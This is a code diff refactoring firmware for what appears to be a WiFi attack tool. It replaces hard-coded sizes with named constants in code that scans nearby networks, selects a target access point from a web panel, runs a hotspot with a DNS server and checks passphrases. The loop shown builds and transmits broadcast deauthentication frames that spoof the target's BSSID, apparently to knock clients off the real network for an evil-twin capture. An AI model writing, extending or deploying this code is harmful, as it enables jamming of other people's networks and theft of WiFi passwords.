@@ -7,16 +7,17 @@
 Preferences prefs; // NVS flash: log + uptime survive reboots
 
 String bytesToStr(const uint8_t* b, uint32_t size);
+const int MAX_NETWORKS = 16;
+const int MAC_LEN = 6;
 
 typedef struct
 {
   String ssid;
   uint8_t ch;
-  uint8_t bssid[6];
+  uint8_t bssid[MAC_LEN];
 } _Network;
 
 const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 1, 1);
 DNSServer dnsServer;
 WebServer webServer(80);
 
@@ -31,11 +32,11 @@ void denyToken() {
   webServer.send(401, "text/plain", "401: admin token required");
 }
 
-_Network _networks[16];
+_Network _networks[MAX_NETWORKS];
 _Network _selectedNetwork;
 
 void clearArray() {
-  for (int i = 0; i < 16; i++) {
+  for (int i = 0; i < MAX_NETWORKS; i++) {
     _Network _network;
     _networks[i] = _network;
   }
@@ -163,7 +164,7 @@ bool isValidPassphrase(const String& s) {
 }
 
 bool hasBssid(const uint8_t* b) {
-  for (int i = 0; i < 6; i++) {
+  for (int i = 0; i < MAC_LEN; i++) {
     if (b[i] != 0) return true;
   }
   return false;
@@ -340,10 +341,10 @@ void performScan() {
   int n = WiFi.scanNetworks();
   clearArray();
   if (n >= 0) {
-    for (int i = 0; i < n && i < 16; ++i) {
+    for (int i = 0; i < n && i < MAX_NETWORKS; ++i) {
       _Network network;
       network.ssid = WiFi.SSID(i);
-      for (int j = 0; j < 6; j++) {
+      for (int j = 0; j < MAC_LEN; j++) {
         network.bssid[j] = WiFi.BSSID(i)[j];
       }
       network.ch = WiFi.channel(i);
@@ -391,13 +392,13 @@ String controlPage() {
   html.replace("{hotspot}", hotspot_active ? "stop" : "start");
   html.replace("{disabled}", hasTarget() ? "" : " disabled");
 
-  String selectedBssid = bytesToStr(_selectedNetwork.bssid, 6);
+  String selectedBssid = bytesToStr(_selectedNetwork.bssid, MAC_LEN);
 
-  for (int i = 0; i < 16; ++i) {
+  for (int i = 0; i < MAX_NETWORKS; ++i) {
     if (_networks[i].ssid == "") {
       break;
     }
-    String bssid = bytesToStr(_networks[i].bssid, 6);
+    String bssid = bytesToStr(_networks[i].bssid, MAC_LEN);
     html += "<tr><td>";
     html += htmlEscape(_networks[i].ssid);
     html += "</td><td>";
@@ -441,8 +442,8 @@ String controlPage() {
 // handles ?ap=, ?deauth= and ?hotspot= from the panel; returns true when a hotspot toggle was requested
 bool applyControlArgs() {
   if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (hasBssid(_networks[i].bssid) && bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
+    for (int i = 0; i < MAX_NETWORKS; i++) {
+      if (hasBssid(_networks[i].bssid) && bytesToStr(_networks[i].bssid, MAC_LEN) == webServer.arg("ap")) {
         _selectedNetwork = _networks[i];
       }
     }
@@ -541,7 +542,7 @@ unsigned long now = 0;
 unsigned long wifinow = 0;
 unsigned long deauth_now = 0;
 
-uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+uint8_t broadcast[MAC_LEN] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
 uint8_t wifi_channel = 1;
 
 void loop() {
@@ -568,8 +569,8 @@ void loop() {
     // Deauth frame: FF..FF (broadcast) <- AP's BSSID, reason code 1
     uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
 
-    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
-    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
+    memcpy(&deauthPacket[10], _selectedNetwork.bssid, MAC_LEN);
+    memcpy(&deauthPacket[16], _selectedNetwork.bssid, MAC_LEN);
     deauthPacket[24] = 1;   // deauth reason
     deauthPacket[25] = 0;
 
@@ -603,14 +604,5 @@ void loop() {
   if (millis() - now >= 15000 && !hotspot_active && !deauthing_active) {
     performScan();
     now = millis();
-  }
-
-  if (millis() - wifinow >= 2000) {
-    if (WiFi.status() != WL_CONNECTED) {
-      Serial.println("BAD");
-    } else {
-      Serial.println("GOOD");
-    }
-    wifinow = millis();
   }
 }
